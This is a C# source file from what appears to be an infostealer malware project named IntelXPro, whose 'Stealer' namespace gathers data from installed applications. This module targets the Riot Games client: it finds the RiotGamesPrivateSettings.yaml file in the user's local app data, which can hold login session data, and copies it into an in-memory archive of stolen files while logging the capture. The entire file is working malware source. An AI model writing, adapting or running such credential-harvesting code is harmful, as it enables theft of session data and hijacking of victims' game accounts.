using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class RiotGames : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Riot Games", "Riot Client", "Data", "RiotGamesPrivateSettings.yaml");
            if (File.Exists(text))
            {
                string text2 = Path.Combine("Riot", "RiotGamesPrivateSettings.yaml");
                zip.AddFile(text2, File.ReadAllBytes(text));
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "Riot";
                counterApplications.Files.Add(text + " => " + text2);
                counter.Games.Add(counterApplications);
            }
        }
    }
}
